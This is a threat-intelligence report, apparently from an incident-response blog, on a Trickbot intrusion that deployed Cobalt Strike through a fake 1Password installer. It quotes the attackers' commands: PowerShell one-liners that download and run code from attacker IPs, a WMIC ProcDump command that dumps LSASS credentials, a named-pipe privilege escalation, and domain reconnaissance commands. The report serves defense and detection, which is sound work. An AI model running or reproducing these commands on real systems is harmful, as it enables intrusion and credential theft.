# Case Summary

We assess with medium confidence that the initial threat vector for this intrusion was a password protected archive, delivered via malspam campaigns. The zip attachment would likely contain a Word or Excel document with macros, which upon execution, would start a Trickbot infection.

The Trickbot payload injected itself into the system process wermgr.exe — the Windows process responsible for error reporting. The threat actor then utilized built-in Windows utilities such as net.exe, ipconfig.exe and nltest.exe for performing internal reconnaissance.

Within two minutes of the discovery activity, WDigest authentication was enabled (disabled by default in Windows 10) in the registry on the infected host. This enforces credential information to be saved in cleartext in memory. Shortly after applying this registry modification, the LSASS process was dumped to disk using the Sysinternals tool ProcDump.



Having obtained sensitive credentials, WMIC was used to deploy a fake password manager application across multiple systems in the network. The installed software package appears to have been trying to masquerade as the 1Password windows installer and password vault software. The fake installer drops and executes a file embedded with Cobalt Strike stager shellcode, which attempts to fetch a CS beacon.

With the additional remote sessions, the attackers ran encoded PowerShell commands, one of which loaded the Active Directory module and collected information about Windows computers in the domain. The results were dumped into a CSV file. Another PowerShell script, named “Get-DataInfo.ps1”, aimed to provide a list of active systems including its anti-virus state. This behavior was also observed in one of our previous intrusion cases.

No exfiltration of data or impact to the systems was observed. It is unclear why the actors decided not to continue with their operation.

# Analysis

# Initial Access

The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.

# Execution

The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint. The visual representation of process tree execution pattern on beachhead can be seen below.

Upon execution, the payload injects into the wermgr.exe process.







The injected wermgr.exe process then creates a new folder in the user’s AppData directory. As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).



Trickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:
- cmd.exe /c powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://23.19.227[.]147:80/atryhdthgfhfhf'))"
- cmd.exe /c powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://108.62.118[.]247:80/adfsdgsdg'))"
- cmd.exe /c powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://5.199.162[.]3:80/adhrdbh'))"
- cmd.exe /c powershell.exe -nop -w hidden -c "iex ((new-object net.webclient).downloadstring('http://212.114.52[.]180:80/atyukloyuiluiyluiyl'))"

The fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.



# Persistence

The launcher.bat file, which triggers the Trickbot executable, is set to start via a scheduled task:

# Privilege Escalation

The GetSystem named pipe impersonation technique was observed to obtain SYSTEM-level privileges on the domain controller.

cmd.exe /c echo 31b925aa0f7 > \\.\pipe\8945a5

# Defense Evasion

To prepare for code injection, the Trickbot executable allocated memory in the address space of the Windows system process “wermgr.exe” (Windows Error Reporting Module).

The injected wermgr.exe process then called svchost.exe (without any command line arguments), which in turn was used to run various reconnaissance commands. More about that in the “Discovery” section below.

# Credential Access

The threat actor enabled WDigest authentication by changing the value of the “UseLogonCredential” object from 0 to 1 in the Windows registry. This enforces the storage of credentials in plaintext on future logins.

Procdump v9.0 (SHA1: d1387f3c94464d81f1a64207315b13bf578fd10c) was downloaded using PowerShell and used to dump the LSASS process to disk.

wmic /node:"<redacted>" process call create "cmd /c c:\perflogs\procdump.exe -accepteula -ma lsass c:\perflogs\lsass.dmp"

# Discovery

On the initial beachhead, various discovery commands were executed from the injected svchost.exe process.
- ipconfig /all
- net config workstation
- net view /all
- net view /all /domain
- nltest /domain_trusts
- nltest /domain_trusts /all_trusts

A diverse set of reconnaissance commands were also observed from the Cobalt Strike beacons:
- net group "domain admins" /domain
- time
- ping <redacted>
- nltest /domain_trusts /all_trusts
- nltest /dclist:"<redacted>"
- net group "enterprise admins" /domain

Using the WMI class “win32_logicaldisk”, (free) disk space information was gathered of the attached (network) drive letters.

The threat actor made use of the Active Directory module to save hostname, OS and last logon date information of all AD Computer objects in a CSV file.

In addition, all of the IP-addresses in the LAN were scanned on port 445/SMB, potentially to identify other interesting targets.

The following set of files were copied to the domain controller:
- 7-zip.dll
- 7z.dll
- 7z.exe
- get-datainfo.ps1
- netscan.exe
- start.bat

Already covered in a previous case, the batch and PowerShell scripts serve as a data collector to enumerate hosts within the target environment. It collects data about active/dead hosts, disks, and installed software; and stores it in a zip file.

# Lateral Movement

A file named Setup1.exe was dropped on multiple systems within the environment and executed using WMIC.

c:\windows\system32\cmd.exe /c wmic /node:"<REDACTED>" process call create "c:\perflogs\setup1.exe"

In an attempt to blend in, the Setup1.exe file acts as a fake installer for “1Password”, a popular online password manager.



When the file is executed, it drops various files in the user’s AppData directory, including “filepass.exe”, which is started as a child process. It appears the threat actors used LPUB3D as a shell for this install, as all the folders and some of the dlls are from LPub3D, an Open Source WYSIWYG editing application for creating LEGO® style digital building instructions.

Filepass.exe then loads an unsigned DLL named theora2.dll:

theora2.dll reads the data from an XML-file named “cds.xml”. This file is stored in the same directory (AppData\Roaming\1Password).

This file seems to contain the XML documentation (in Russian) of the System.IO package.



If we scroll down in the XML-file, we will find data patterns which seem to be obfuscated and unreadable:



A subset of the file buffer (cds.xml), which contains the obfuscated data patterns, is saved into a separate memory location.



The obfuscated/encrypted shellcode is then sent into a Cobalt Strike named pipe. In this case, the threat actor did not bother to change the default pipe naming convention of Cobalt Strike. Pipes being created with the name MSSE-*-server are a great indicator to hunt for.

From here, the CS stager used the WinInet API in an attempt to fetch a Cobalt Strike beacon hosted on windowsupdatesc[.]com.

In the raw shellcode we can find the URI and the User-Agent:

The HTTPS beacon spawned by filepass.exe continues to check in every ~5 seconds.

# Command and Control

# Trickbot:

The initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red: https://tria.ge/210617-6hxwajevbs

# Cobalt Strike:

Example request: 
- 23.19.227.147
- securityupdateav[.]com

# MITRE ATT&CK DATASET
T1055.012 – Process Injection: Process Hollowing

T1053.005 – Scheduled Task/Job: Scheduled Task

T1059.001 – Command and Scripting Interpreter: PowerShell

T1071.001 – Application Layer Protocol: Web Protocols

T1003.001 – OS Credential Dumping: LSASS Memory

T1444 – Masquerade as Legitimate Application

T1069 – Permission Groups Discovery

T1018 – Remote System Discovery

T1082 – System Information Discovery

T1016 – System Network Configuration Discovery

T1033 – System Owner/User Discovery

T1482 – Domain Trust Discovery

T1134 – Access Token Manipulation

T1105 – Ingress Tool Transfer

T1046 – Network Service Scanning

T1047 – Windows Management Instrumentation

Internal case #4778

Share this: Twitter

LinkedIn

Reddit

Facebook

WhatsApp

